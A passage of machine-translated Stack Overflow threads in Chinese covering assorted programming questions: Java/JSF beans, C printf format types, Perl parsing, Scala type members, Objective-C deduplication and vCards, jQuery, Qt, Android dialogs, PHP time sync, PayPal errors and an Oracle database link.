    return page;
}

public void setPage(int page) {

    this.page = page;
}

public String getId_r() {
    return id_r;
}

public void setId_r(String id_r) {
    this.id_r = id_r;
}

public List<SRGarantieCasa> getFiles() {
    return files;
}

public void setFiles(List<SRGarantieCasa> files) {
    this.files = files;
}

public String viderChamps() {
    // vider les champ
    id_r = "";
    return null;
}

public String search() {
    if (id_r == "") {
        files = fileService.getListeFiles();
    } else {
        files.clear();
        files = fileService.getFile(id_r);
    }
    return null;
}

public String accesDetail() {
    return "GCUpdate?faces-redirect=true";
}

public String saveFile() {
    fileService.updateFile(selectedFile);
    return "GarantieCasa?faces-redirect=true";

}

public String ajoutFile() {

    fileService.addfile(file);
    return "GarantieCasa?faces-redirect=true";

}

public String addFile() {
    return "GarantieCasaAdd?faces-redirect=true";
}

public SRGarantieCasa getFile() {
    return file;
}

public void setFile(SRGarantieCasa file) {
    this.file = file;
}

public GarantiCasaBean() {
    /*
     * suggestions = new ArrayList<String>(); suggestions.add("Banana");
     * suggestions.add("Cranberry"); suggestions.add("Blueberry");
     * suggestions.add("Orange"); suggestions.add("Apple");
     * suggestions.add("Strawberry");
     */
}
 public void update()
    {
     for (SRGarantieCasa selectedFile : fileService.getListeFiles()){
         System.out.println("GarantieCasaBean : Mother Code :"+selectedFile.getMother_Code());
        fileService.updateFile(selectedFile);

     }
        //return "GarantieCasa?faces-redirect=true";
    } 
```

}

这是春季会议：

```
<!-- Service UI -->
<bean id="fileBean" class="ui.bean.GarantiCasaBean" scope="request">
    <property name="fileService" ref="SO_GestionFile" />
    <property name="file" ref="fileCGC" />
</bean>

<bean id="fileCGC" class="common.pojo.SRGarantieCasa" scope="session" /> 
```

我在该主题中发现了同样的问题： [Richfaces editable dataTable not setting updated values in Bean](https://stackoverflow.com/questions/10897427/richfaces-editable-datatable-not-setting-updated-values-in-bean)

但我 @this ， @All 对我不起作用 :( 请帮帮我

# objective-c - 如何修复错误格式指定类型'char *'但参数的类型为'char'

> ID：14039329
> 
> 赞同：9
> 
> 时间：2012-12-26T10:33:17.323
> 
> 标签：objective-c, c, xcode

我收到一条警告说：“格式指定类型'char *'，但参数的类型为'char'”用于学生变量。我正在将一本书中的代码复制/粘贴到 xcode 中，但不知道如何解决这个问题。在控制台中打印的唯一内容是“（lldb）”。任何建议

```
#include <stdio.h>

void congratulateStudent(char student, char course, int numDays)
{
    printf("%s has done as much %s Programming as I could fit into %d days.\n", student, course, numDays);
}

int main(int argc, const char * argv[])
{
    // insert code here...
    congratulateStudent("mark", "Cocoa", 5);
    return 0;
} 
```

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-12-26T10:35:12.427

```
void congratulateStudent(char *student, char *course, int numDays) 
```

`%s`意味着您要打印一个字符串（字符数组）

`char student`这意味着学生是一种`char`类型

所以这里的学生不是指向字符串的指针

为了将学生类型从 char 更改为字符串指针，您必须向学生添加星号`char *student`

在您的代码中，您正在调用`congratulateStudent`带有输入参数的字符串`"mark"`。所以为了支持这个字符串，输入参数`student`应该定义为字符串的指针

所以你在学生的定义中缺少星号

同样的事情`course`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:46:06.287

`void congratulateStudent(char *student, char *course, int numDays)`

使用函数签名，因为您将字符串作为参数传递给函数，`main`但函数具有字符类型参数。

# perl - Perl 数据解析和插入行

> ID：14039330
> 
> 赞同：2
> 
> 时间：2012-12-26T10:33:24.930
> 
> 标签：perl, parsing

向全世界的 Perl 大师致敬！

我有一个像这样的文件要解析并想要制作......

从第一列开始，ID、外显子信息、起始位置、结束位置和方向。ID 遇到一个数时加 1。

```
1   9239    712 8571    +
1   start_codon 712 714 +
1   stop_codon  8569    8571    +
2   3882    24137   24264   +
2   start_codon 24137   24139   +
3   3882    24322   24391   +
4   3882    24490   26064   +
4   stop_codon  26062   26064   +
5   4972    26704   26740   +
5   start_codon 26704   26706   +
6   4972    26814   27170   +
7   4972    27257   27978   +
7   stop_codon  27976   27978   +
8   10048   40161   41114   -
8   start_codon 41112   41114   -
8   stop_codon  40161   40163   -
9   272 43167   43629   -
9   stop_codon  43167   43169   -
10  272 43755   44059   -
10  start_codon 44057   44059   - 
```

像这样 ....

```
1   9239    *712*   *8571*  +
1   start_codon 712 714 +
1   stop_codon  8569    8571    +
*X  9239    712 8571    +*
2   3882    *24137* 24264   +
2   start_codon 24137   24139   +
3   3882    24322   24391   +
4   3882    24490   *26064* +
4   stop_codon  26062   26064   +
*X  3882    24173   26064   +*
5   4972    *26704* 26740   +
5   start_codon 26704   26706   +
6   4972    26814   27170   +
7   4972    27257   *27978* +
7   stop_codon  27976   27978   +
*X  4972    26704   27978 +*
8   10048   *40161* *41114* -
8   start_codon 41112   41114   -
8   stop_codon  40161   40163   -
*X  10048   40161   41114   -*
9   272 *43167* 43629   -
9   stop_codon  43167   43169   -
10  272 43755   *44059* -
10  start_codon 44057   44059   -
*X  272 43167   44059   -* 
```

必须添加以 X 开头的每一行，但以我的技能我不能... :(

问题是对于第二列中的每个外显子编号，忽略“start_codon”和“end_codon”，必须在星号 * 之间获得最小编号的外显子位置和最大编号的外显子位置。

这是我解析数据的基本代码......但我想，必须从头开始重新编码（我不知道如何插入行'X'）

（对不起，我删除了代码，因为它不够好，可能会造成混乱......）

世界上的Perl大师，你能帮帮我吗？？？

谢谢！！

正如 TLP 所说，我把我的代码放回去了。虽然它的令人尴尬的代码

```
use strict;

if (@ARGV != 1) {
    print "Invalid arguments\n";
    print "Usage: perl min_max.pl [exon_output_file]\n";
    exit(0);
}

my $FILENAME = $ARGV[0];
    my  $exonid = 0;
    my  $exon = "";
    my  $startpos = 0;
    my  $endpos = 0;
    my  $strand = "";
    my  $min_pos = 0;
    my  $max_pos = 0;

open (DATA, $FILENAME);

while (my $line = <DATA>) {
    chomp $line;

    if ($line ne "") {
        if ($line =~ /^(.+)\t(.+)\t(.+)\t(.+)\t(.+)/) {
        $exonid = $1;
        $exon = $2;
        $startpos = $3;
        $endpos = $4;
        $strand = $5;
        }
        if ($exon =~ /\d+/) {
            print $exonid,"\t",$exon,"\t",$startpos,"\t",$endpos,"\t",$strand,"\n";
        } else {
            print $exonid,"\t",$exon,"\t",$startpos,"\t",$endpos,"\t",$strand,"\n";
        }
    }
}

close (DATA);
exit; 
```

如何比较最大值和最小值....

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T13:09:56.043

基本上你所做的就是遍历这些行，跳过你不想要的那些（即第 2 列中没有数字），记住同一组中每个新行的最小/最大值，以及当第 2 列数字更改时打印和重来。使用此解决方案，您还必须在最后手动打印最后一组。

此代码将内部`DATA`文件句柄用于演示数据。只需更改`<DATA>`为`<>`在目标输入文件上使用，如下所示：`perl script.pl inputfile`

```
use strict;
use warnings;
use List::Util qw(min max);

my $print;
my ($min, $max, $id);
while (<DATA>) {                   ###### change to <> to run on input file
    my @line = split;
    if ($line[1] !~ /^\d+$/) {                # if non-numbers in col 2
         print;                               # print line
         next;                                # skip to next line
    }
    if (!defined($id) or $id != $line[1]) {   # New dataset!
        say $print if $print;                 # Print and reset 
        $id = $line[1];
        $min = $max = undef;
    }
    $min = min($min // (), @line[2,3]);       # find min/max, skip undef
    $max = max($max // (), @line[2,3]);
    $print = join "\t", "X", $line[1], $min, $max;  # buffer the print
}
print $print;

__DATA__
1   9239    712 8571    +
1   start_codon 712 714 +
1   stop_codon  8569    8571    +
2   3882    24137   24264   +
2   start_codon 24137   24139   +
3   3882    24322   24391   +
4   3882    24490   26064   +
4   stop_codon  26062   26064   +
5   4972    26704   26740   +
5   start_codon 26704   26706   +
6   4972    26814   27170   +
7   4972    27257   27978   +
7   stop_codon  27976   27978   +
8   10048   40161   41114   -
8   start_codon 41112   41114   -
8   stop_codon  40161   40163   -
9   272 43167   43629   -
9   stop_codon  43167   43169   -
10  272 43755   44059   -
10  start_codon 44057   44059   - 
```

**输出：**

```
9239    712     8571
3882    24137   26064
4972    26704   27978
10048   40161   41114
272     43167   44059 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T12:34:10.453

如果我理解正确，这里有一种方法（未经测试！）来做你似乎要求的事情：

```
use strict;
use warnings;
use feature 'say';

# read first line, initialize accumulators, print it back
chomp($_ = <>);
my ($last_id, $last_exon, $min_start, $max_end, $last_strand) = split /\t/;
say $_;

# loop over remaining lines
while (<>) {
    chomp;
    my ($exonid, $exon, $startpos, $endpos, $strand) = split /\t/;

    if ($exon !~ /\D/ and $exon != $last_exon) {
        # new exon found, print summary of last one...
        say join "\t", "X", $last_exon, $min_start, $max_end, $last_strand;
        # ...and reset accumulators
        ($last_id, $last_exon, $min_start, $max_end, $last_strand)
            = ($exonid, $exon, $startpos, $endpos, $strand);
    }
    else {
        # previous exon continues, just update accumulators
        $last_id     = $exonid;
        $last_exon   = $exon     if $exon !~ /\D/;
        $min_start   = $startpos if $min_start > $startpos;
        $max_end     = $endpos   if $max_end < $endpos;
        $last_strand = $strand;  # should not really be needed
    }
    # ...and don't forget to print the original line back again
    say $_;
}
# end of file, print summary of last exon
print join("\t", "X", $last_exon, $min_start, $max_end, $last_strand), "\n"; 
```

基本上，我假设您想要打印一个摘要行，`X`每当您在第二列中遇到一个与该列中的前一个数字不同的数字时，并且第二列中具有非数字值的行不应该触发总结。此外，您可能还希望在文件末尾有一个摘要行。

如果仅包含数字，则表达式`$exon !~ /\D/`返回 true 。`$exon`（具体来说，它测试它*是否不*包含*非*数字字符，因此空字符串也会匹配。）

有很多边缘情况我没有考虑过，因为我不知道它们是否可能出现在您的数据中，以及如果确实发生了您希望如何处理它们。例如，为了小心，人们可能还希望打印一个摘要，以防万一链发生变化而外显子数保持不变。同样，细心的程序员可能想要考虑输入文件为空的可能性，或者第一行在第二列中包含非数字值的可能性。

至少`use warnings`如果我假设的任何值总是数字的结果不是这样，你会被提醒。

# scala - Scala - 返回类型参数化对象的类型参数化特征方法 - 如何实现？

> ID：14039333
> 
> 赞同：3
> 
> 时间：2012-12-26T10:33:39.627
> 
> 标签：scala, types, implementation, type-systems, traits

我有以下类层次结构：

```
trait Entity {
  type E <: Entity
  type S <: Something[E]
  def in: S
}

trait Something[E <: Entity] {
  def doSomething {
    // something
  }
}

class A extends Entity {
  def in = InA
  object InA extends Something[A]
}
class B extends Entity {
  def in = InB
  object InB extends Something[B]
}
class C extends Entity {
  def in = InC
  object InC extends Something[C]
} 
```

在其他地方我想：

```
val entities = Seq[Entity]
entities.map(_.in.doSomething) 
```

然而，类型系统并没有让我摆脱那个`in`方法定义——我只是不知道我应该在那里指定什么类型才能让这段代码工作？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-26T10:49:35.943

如果您像这样覆盖类型成员，它会起作用。Scala 不会自动推断它们。

```
class A extends Entity {
  type E = A
  type S = Something[A]
  def in = InA
  object InA extends Something[A]
}
class B extends Entity {
  type E = B
  type S = Something[B]
  def in = InB
  object InB extends Something[B]
}
class C extends Entity {
  type E = C
  type S = Something[C]
  def in = InC
  object InC extends Something[C]
} 
```

另一种选择是取消类型成员，只使用类型参数。

```
trait Entity[E <: Entity[E]] {
  def in: Something[E]
}

trait Something[E <: Entity[E]] {
  def doSomething {
    // something
  }
}

class A extends Entity[A] {
  def in = InA
  object InA extends Something[A]
}
class B extends Entity[B] {
  def in = InB
  object InB extends Something[B]
}
class C extends Entity[C] {
  def in = InC
  object InC extends Something[C]
}

val entities = Seq[Entity[_]]()
entities.map(_.in.doSomething) 
```

这使用了一种称为[F-bounded polymorphism](http://twitter.github.com/scala_school/advanced-types.html#fbounded)的技术。

# objective-c - 如何根据某个键从 NSDictionary 中删除重复记录？

> ID：14039334
> 
> 赞同：1
> 
> 时间：2012-12-26T10:33:44.647
> 
> 标签：objective-c, nsdictionary

```
submittedTestArray =   [{
        scheduledTestId = "F7F15169-2FB6-4E47-A971-BAAD40D152AB";
        studentId = "8b3df16f-ff2f-4ad4-839c-6a937b79854d";
        submittedTestId = "37F20871-FB3A-47AA-B254-9E5409C5E4C4";
    }, {
        scheduledTestId = "440947DD-0A01-4DB8-8DD5-CCFA8F852FD3";
        studentId = "8b3df16f-ff2f-4ad4-839c-6a937b79854d";
        submittedTestId = "681689DC-B35C-491C-A737-AB19D9116FD9";
    }, {
        scheduledTestId = "440947DD-0A01-4DB8-8DD5-CCFA8F852FD3";
        studentId = "8b3df16f-ff2f-4ad4-839c-6a937b79854d";
        submittedTestId = "681689DC-B35C-491C-A737-AB19D9116FD9";
    }, {
        scheduledTestId = "440947DD-0A01-4DB8-8DD5-CCFA8F852FD3";
        studentId = "e18ead0a-d0fc-4e15-96ee-ecbd32880d97";
        submittedTestId = "A46965C6-14B1-401E-97C5-AD5BADCC02EE";
    }] 
```

我希望所有 NSDictionary 对象唯一地基于***scheduleTestId***

如果我考虑上面的例子，那么它会给我两个 NSDictionary 对象。

我暂时使用以下代码。

```
NSMutableArray *uniqueKeys =  [NSMutableArray arrayWithArray:[submittedTestArray valueForKeyPath:@"@distinctUnionOfObjects.scheduledTestId"]];
NSMutableArray *submittedTestUniqueArray = [[NSMutableArray alloc] initWithCapacity:uniqueKeys.count];
for (SubmittedTest *submittedTest in submittedTestArray) {
    if ([uniqueKeys containsObject:submittedTest.scheduledTestId ]) {
        [uniqueKeys removeObject:submittedTest.scheduledTestId];
        [submittedTestUniqueArray addObject:submittedTest];
    }
} 
```

***submitTestUniqueArray***包含我想要的输出，即

```
[{
    scheduledTestId = "F7F15169-2FB6-4E47-A971-BAAD40D152AB";
    studentId = "8b3df16f-ff2f-4ad4-839c-6a937b79854d";
    submittedTestId = "37F20871-FB3A-47AA-B254-9E5409C5E4C4";
}, {
    scheduledTestId = "440947DD-0A01-4DB8-8DD5-CCFA8F852FD3";
    studentId = "8b3df16f-ff2f-4ad4-839c-6a937b79854d";
    submittedTestId = "681689DC-B35C-491C-A737-AB19D9116FD9";
}] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:08:04.263

代替 for-in 循环，使用 for 循环并在每次迭代之后

```
if ([uniqueKeys containsObject:submittedTest.scheduledTestId ]) {
        [uniqueKeys removeObject:submittedTest.scheduledTestId];

    }
else
{
[submittedTestArray removeObjectAtIndex:currentIndex];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-27T12:40:53.527

我不知道我在写什么是合格的，但我仍然敢于回答。

理想情况下，您尝试过的是完美的。因为要从字典中删除重复记录，需要有一堆记录，在本例中是一个名为**uniqueKeys**的数组，其中包含**scheduleTestId**值，以将每个字典元素与所有其他元素进行比较以进行重复。

这正是你所做的。

我可以在此代码中建议的唯一改进是`NSMutableArray *uniqueKeys`

将其更改为`NSArray *uniqueKeys;`并在完成比较并收集具有唯一记录的字典对象后，刷新数组元素而不是一一删除它们。

因为有 2 个可变数组，一个只有唯一的键，另一个有具有唯一记录的字典对象没有任何意义。当然，我认为您不需要只有唯一键的数组。你需要的是字典而不是数组，对吧？

所以简而言之，我在您的代码中没有发现任何性能改进。

@ALL：如果我的技术知识有任何改进，请告诉我。

干杯快乐编码

# javascript - Jquery $(element).hide().blur().show() 显示所有元素

> ID：14039338
> 
> 赞同：-2
> 
> 时间：2012-12-26T10:33:57.983
> 
> 标签：javascript, jquery, html

我的页面上有 3 个下拉列表。2 显示设置为无。当我单击下拉列表（注意只是单击，不要选择）并将鼠标悬停在 hello 文本上时，第一个下拉列表被重置，但下拉列表将显示设置为无也显示在旁边。我不希望发生这种情况。

这是我的html代码

```
 <div id="mnc"> hello
</div>
<div id="slpt">
    <select id="slt">
        <option value="0">Option1</option>
        <option>Option2</option>
        <option>Option3</option>
        <option>Option4</option>
        <option>Option5</option>
</select>

    <select id="slt1" style="display:none;">
        <option value="0">Option1</option>
        <option>Option2</option>
        <option>Option3</option>
        <option>Option4</option>
        <option>Option5</option>
</select>

     <select id="slt2" style="display:none;">
        <option value="0">Option1</option>
        <option>Option2</option>
        <option>Option3</option>
        <option>Option4</option>
        <option>Option5</option>
</select>
</div> 
```

这是jquery代码

```
$(document).ready(function() {
    $('#mnc').mouseover(function() {
        $('select').hide().blur().show();
    });
}); 
```

这是[jsfiddle](http://jsfiddle.net/PZCQq/1/) ​</p>

​</p>

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:37:52.110

这只会影响可见`<select>`元素：

```
$('select:visible').hide().blur().show(); 
```

参考：[http ://api.jquery.com/visible-selector/](http://api.jquery.com/visible-selector/)

但是，我不明白为什么你会在`blur()`通话之前隐藏它，只是为了在它之后立即再次显示它。您可以轻松地将代码简化为仅调用`.blur()`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:36:49.227

如果要显示所有[**可见的**](http://api.jquery.com/visible-selector/)选择框

尝试

```
$(document).ready(function(){
$('#mnc').mouseover(function() {
        $('select:visible').hide().blur().show();
    });
}); 
```

***编辑：***基于编辑到可见下拉列表的评论

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:39:54.437

使用`:visible`..this 选择所有仅可见的元素

这是小提琴..

[http://jsfiddle.net/PZCQq/4/](http://jsfiddle.net/PZCQq/4/)

# qt - 光标在其位置时如何自动选择字母？

> ID：14039340
> 
> 赞同：0
> 
> 时间：2012-12-26T10:34:11.973
> 
> 标签：qt, qt4

大家好，我在 qt 中使用双旋转框，其中我有 0.00，我想做的是，当我的光标位于第一个零时，它应该被选中，而不是我按下 shift 键来选择，当我按下右箭头键，然后应该选择第二个0等等。怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T11:25:33.510

你应该子类化`QDoubleSpinBox`，然后`lineEdit()->setInputMask("9.99")`做这件事。示例代码：

```
#include <QDoubleSpinBox>
#include <QLineEdit>

class MyDoubleSpinBox : public QDoubleSpinBox
{
    Q_OBJECT
public:
    explicit MyDoubleSpinBox(QWidget *parent = 0) : QDoubleSpinBox(parent) {
        lineEdit()->setInputMask("9.99");
    }
}; 
```

# android - 当用户在相关对话上按下肯定按钮时完成一项活动

> ID：14039341
> 
> 赞同：0
> 
> 时间：2012-12-26T10:34:14.027
> 
> 标签：android, android-dialog

我希望我的活动（显示对话）在用户单击对话的正面按钮时完成。这可能吗。我在哪里放置finish（）？

调用对话的代码：

```
if(name.equals("")) {

        DialogFragment newFragment = new NouserFragment();
        newFragment.show(getFragmentManager(), "makeprofile"); } 
```

对话代码：

```
public Dialog onCreateDialog(Bundle savedInstanceState) {

    // Use the Builder class for convenient dialog construction

    AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
    builder.setMessage(R.string.nouseralert)
           .setPositiveButton(R.string.add, new DialogInterface.OnClickListener() {
               public void onClick(DialogInterface dialog, int id) {

                   Intent intent = new Intent(getActivity(), Editprofile.class);
                   startActivityForResult(intent, 0);  

               }
           })
           .setNegativeButton(R.string.ignore, new DialogInterface.OnClickListener() {
               public void onClick(DialogInterface dialog, int id) {
                   // User cancelled the dialog
               }
           });
    // Create the AlertDialog object and return it
    return builder.create();
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:10:32.517

好的。我能够通过在对话界面`getActivity().finish()`下完成活动。`onClick()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:38:52.020

您可以使用以下代码：

```
public void showMessageAlert(){
        runOnUiThread(new Runnable() {
            public void run() {
                AlertDialog.Builder builder = new AlertDialog.Builder(HomeScreen.this);

                builder.setTitle(ConfigClass.ALERT_TITLE);
                builder.setMessage(ConfigClass.MSG_ALERT);

                builder.setCancelable(true);
                builder.setInverseBackgroundForced(true);
                builder.setPositiveButton("I Accept",   new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface arg0, int arg1) {
                        ActivityName.this.finish();
                    }
                });
                builder.setNegativeButton("I decline",  new DialogInterface.OnClickListener() {
                    public void onClick(DialogInterface arg0, int arg1) {
                        //Do nothing
                    }
                });
                AlertDialog alert = builder.create();
                alert.show();
            }
        });
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:36:59.193

单击对话框调用的正按钮，`dialog.dismiss();`然后`finish();`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T10:41:42.443

这是内部类可见性/范围的Java问题。在侦听器内部，`this`指的是`OnClickListener`对象并且（幸运的是）它没有`finish()`方法。让它引用活动，或者：

*   如果在活动中定义了侦听器，则使用简单`finish()`的，不带任何前缀。这样，Java 将寻找最近的封闭对象，该对象定义了一个名为 的方法`finish()`，它会找到 Activity 的
*   用于`YouActivity.this.finish()`引用封闭的活动实例，没有任何歧义（如果侦听器是（可能是匿名的）内部类，则显然这是正确的`YourActivity`
*   如果您的活动的某些实例完全在另一个文件中定义，则调用`mActivity.finish()`它（也许您必须强制转换`Context`对象）

通常侦听器被定义为活动内部的匿名内部类，因此不带前缀调用 finish() 就足够了，但`A.this.finish()`如果存在名称冲突，您可能需要使用该表单

# php - 如何解决 b/w 本地服务器时间和 GMT 时间的时差？

> ID：14039349
> 
> 赞同：0
> 
> 时间：2012-12-26T10:35:06.953
> 
> 标签：php, timezone

```
date_default_timezone_set('Asia/Calcutta');
echo date('d-m-y  h:i:s',time());
-------------------------------------------
26-12-2012 03:07:48 
```

同时 GMT +05:30 从[这里](http://wwp.greenwichmeantime.com/time-zone/asia/india/time/)

```
26-12-2012 03:12:25 
```

它以分钟为单位给出了一些时差，现在我想使用本地服务器时间的 time ago 功能，但本地服务器从 GMT+05:30 开始提供大约 -4 分钟。如何解决这个问题？

几天前，我在管理员的帮助下将服务器时间更改为 GMT+05:30，现在它再次给出了差异。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:39:43.507

最好的办法是每天/每周运行一个 cronjob，将服务器的时间同步到时间服务器。`ntpdate`您可以使用命令轻松完成此操作

[http://www.bytechemist.com/2009/06/25/use-cron-and-ntpdate-to-keep-your-linux-servers-time-updated/](http://www.bytechemist.com/2009/06/25/use-cron-and-ntpdate-to-keep-your-linux-servers-time-updated/)

# php - 贝宝网关错误

> ID：14039351
> 
> 赞同：0
> 
> 时间：2012-12-26T10:35:22.540
> 
> 标签：php, magento, paypal

我们正在使用 Magento

我在异常日志文件中收到以下错误：

异常 Mage_Core_Exception 带有以下消息：

```
PayPal NVP gateway errors: The transaction cannot complete successfully. 
Instruct the customer to use an alternative payment method 
(#10417: Transaction cannot complete). 
Correlation ID: e9aa67915a70f. 
Version: 60.0\. in /home/necro/necroproduct.com/app/Mage.php:536 
```

谁能帮我解决这个错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:57:52.550

您的日志中有错误代码：

> （#10417：事务无法完成）。

根据[文档](https://cms.paypal.com/ca/cgi-bin/?cmd=_render-content&content_ID=developer/e_howto_api_nvp_errorcodes)，这仅仅意味着客户的账户中没有足够的资金（或没有关联信用卡）来支付该项目，如下所述：

> 与可用资金来源无关的帐户。

或者

> 完成付款需要信用卡或账单协议。

因此，除非您愿意放弃信用卡/账单协议要求（如果您目前完全这样做的话），否则您无能为力。

# android - 将指南针添加到相机

> ID：14039353
> 
> 赞同：2
> 
> 时间：2012-12-26T10:35:36.667
> 
> 标签：android, camera, compass-geolocation

我需要执行以下操作：应用程序制作照片并在 facebook 和 twitter 上分享它们，应用程序必须有一个带指南针的标尺......就像在这个应用程序中一样：

[https://play.google.com/store/apps/details?id=com.sourcebt.android.cameracompass&feature=search_result#?t=W251bGwsMSwyLDEsImNvbS5zb3VyY2VidC5hbmRyb2lkLmNhbWVyYWNvbXBhc3MiXQ](https://play.google.com/store/apps/details?id=com.sourcebt.android.cameracompass&feature=search_result#?t=W251bGwsMSwyLDEsImNvbS5zb3VyY2VidC5hbmRyb2lkLmNhbWVyYWNvbXBhc3MiXQ) ..

问题是我不知道如何制作指南针......如果有人遇到这个问题或知道如何实现它，请帮助我。

谢谢，查理。

# iphone - 如何使用通讯录联系方式在 iPhone 中生成电子名片？

> ID：14039364
> 
> 赞同：4
> 
> 时间：2012-12-26T10:36:43.633
> 
> 标签：iphone, objective-c, ios, vcf-vcard

我有一个应用程序，我想将通讯录详细信息导入到 vcard 格式中。这是我已经完成的代码，但问题是我的电子邮件地址、照片、组织名称等没有保存在 vcard 中。

```
 -(NSString*)vcardrepresentation
{

        NSMutableArray *mutableArray = [[NSMutableArray alloc] init];

        [mutableArray addObject:@"BEGIN:VCARD"];
        [mutableArray addObject:@"VERSION:3.0"];

        [mutableArray addObject:[NSString stringWithFormat:@"FN:%@ %@", self.contactlist.objContact.firstname,self.contactlist.objContact.lastname]];

        [mutableArray addObject:[NSString stringWithFormat:@"ORG:%@",self.contactlist.objContact.companyname]];
        [mutableArray addObject:[NSString stringWithFormat:@"ADR:%@",self.contactlist.objContact.City]];

        if ([phoneArray count]!=0)
            [mutableArray addObject:[NSString stringWithFormat:@"TEL:%@", phoneemail.phoneNumber]];

        if ([emailArray count]!=0)
        {
            [mutableArray addObject:[NSString stringWithFormat:@"EMAIL:%@",phoneemail.phoneNumber]];
        }
    if ([contactlist.objContact.Photo length]==0)
    {
        [mutableArray addObject:[NSString stringWithFormat:@"PHOTO:%@",[UIImage imageNamed:@"man.png"]]];
    }
    else
    {

        [mutableArray addObject:[NSString stringWithFormat:@"PHOTO:%@",[UIImage imageWithData:contactlist.objContact.Photo]]];
    }

        [mutableArray addObject:@"END:VCARD"];

        NSString *string = [mutableArray componentsJoinedByString:@"\n"];

        return string;

} 
```

如何以 vcard 格式保存所有联系人数据？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-27T21:55:06.567

(1) 看起来您正在将`EMAIL`属性的值设置为电话号码。

(2)`ADR`属性格式不正确。正确的格式是将地址分隔成单独的组件，用分号分隔。格式为：

```
ADR:post-office-box;extended-address;street-address;city;state;zip-code;country 
```

如果地址缺少组件（例如，它没有邮政信箱），则应使用空字符串。因此，一个`ADR`值应始终包含 6 个分号。

(3) 分号、逗号、反斜杠，尤其是换行符应该在所有 vCard 属性值中进行转义。分号和逗号字符在某些属性（例如`ADR`和`ORG`）中具有特殊含义，因此这些字符对于这些属性进行转义尤为重要。字符用反斜杠转义，如下所示：`\;`, `\,`, `\\`, `\n`.

(4) 小心折叠。规范建议每行不得超过 75 个字符（不包括换行符）。如果一行超出此限制，则可以通过插入换行符并在行首添加至少一个制表符或空格字符来“折叠”它（如@rjobidon 的答案所示）。

(5) vCard 的正确换行顺序`\r\n`不是`\n`.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-27T15:31:34.497

Rani，我建议使用以下伪代码：

1.  获取联系人照片作为 NSData (contactlist.objContact.Photo)
2.  将 NSData 字节转换为 BASE 64 编码方案（[NSData 到 base64](https://stackoverflow.com/questions/5999370/nsdata-to-base64)，[base64EncodedString](http://www.cocoawithlove.com/2009/06/base64-encoding-options-on-mac-and.html "base64EncodedString()")）
3.  将编码数据和属性添加到 vCard：

`[mutableArray addObject:[NSString stringWithFormat:@"PHOTO;ENCODING=BASE64;TYPE=JPEG:%@", data]];`

供您参考[vCard 照片](http://www.imc.org/pdi/vcard-21.rtf)是使用 Base 64 方案编码的图像。支持 16 种文件格式，包括 GIF 和 JPEG。这是一个例子：

```
照片；编码=BASE64；类型=GIF：
    R0lGODdhfgA4AOYAAAAAAK+vr62trVIxa6WlpZ+fnzEpCEpzlAha/0Kc74+PjyGM
    SuecKRhrtX9/fzExORBSjCEYCGtra2NjYyF7nDGE50JrhAg51qWtOTl7vee1MWu1
    50o5e3PO/3sxcwAx/4R7GBgQOcDAwFoAQt61hJyMGHuUSpRKIf8A/wAY54yMjHtz
    ...
```

# iphone - 无法使用 Enterprise Distribution Program (Ad Hoc DISTRIBUTION) 在设备上下载 IPA 应用程序

> ID：14039367
> 
> 赞同：0
> 
> 时间：2012-12-26T10:36:51.353
> 
> 标签：iphone, ios, xcode

尝试将应用程序安装到设备时出现此错误。错误：下载失败 Safari 无法下载此文件。

我的应用程序正在使用分发证书和移动配置文件。它被上传到构建服务器，在 MAC 机器上下载而不是在设备中。服务器生成一个应用程序下载链接，我在我的设备上使用它来下载应用程序，我收到错误：下载失败 Safari 无法下载此文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:48:52.113

试试这个，因为我相信服务器会生成一个有效的应用程序下载链接。

在创建`Ad Hoc DISTRIBUTION`时，我们需要提供`url link`它，`copying`服务器生成 url 链接以制作 Ad Hoc DISTRIBUTION 的 url 链接时的问题`white space`可能`left`在`begining`：

```
 yourServerGeneratedDownloadLink/yourApplicationName.ipa 
```

**从开头删除空格**

**第二个原因**可能是你`forgot code sigining entity`（个人资料）。结果在提供代码签名实体后，再次生成ipa。现在创建`Ad Hoc DISTRIBUTION`

**第三个原因** `your device`一直没有`added`在`profile`哪个一直`used`为`generating ipa file`。

# sql - Oracle 使用另一个数据库中的值更新表

> ID：14039370
> 
> 赞同：1
> 
> 时间：2012-12-26T10:36:58.633
> 
> 标签：sql, oracle, oracle10g, sql-update

在一个数据库中，我有`PRODUCTS`带有列的表`NAME`和`TECHNICAL_NAME`.

在第二个数据库中，我有一个`TEMP_PRODUCTS`带有列的表`NAME`（对应于第一个 db 中表的列），`NAME`也就是说，应该使用第一个 db 中的相应值进行更新。`PRODUCTS``TECHNICAL_NAME``null``TECHNICAL_NAME`

所以我应该`UPDATE table TEMP_PRODUCTS`使用`JOIN`with columns来做`NAME`？

我想避免从 1st bd 导出表并将其导入到 2nd db 的解决方案。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-26T11:45:05.243

通过创建 DB 链接，我们只能从另一个 DB 访问一个 DB 对象。

```
CREATE DATABASE LINK db1_link 
   CONNECT TO <User Name> IDENTIFIED BY <pwd>
   USING 'db2'; 
```

-- db2 表示 exp 产品 db 的服务名称

然后更新语句

```
